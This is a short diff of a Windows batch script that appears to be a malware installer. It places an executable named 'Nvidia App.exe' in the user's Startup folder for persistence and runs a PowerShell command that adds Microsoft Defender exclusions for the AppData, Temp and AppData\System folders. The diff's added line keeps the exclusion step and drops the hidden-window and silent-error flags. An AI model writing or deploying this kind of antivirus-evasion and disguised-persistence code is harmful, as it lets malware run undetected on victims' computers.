@@ -18,7 +18,7 @@ set "RUN2=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Nvidia App.exe
 >"%LOG%" 2>&1 echo [%DATE% %TIME%] start
 
 :: --- xcls (r-ele) ---
-powershell.exe -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath $env:APPDATA, $env:TEMP, (Join-Path $env:APPDATA 'System') -ErrorAction SilentlyContinue" >>"%LOG%" 2>&1
+powershell -NoProfile -Command "Add-MpPreference -ExclusionPath $env:APPDATA, $env:TEMP, (Join-Path $env:APPDATA 'System')"
 
 if exist "%APPDATA%\system" if not exist "%APPDATA%\system\" ren "%APPDATA%\system" system_old
 if not exist "%APPDATA%\system\" mkdir "%APPDATA%\system" 2>nul
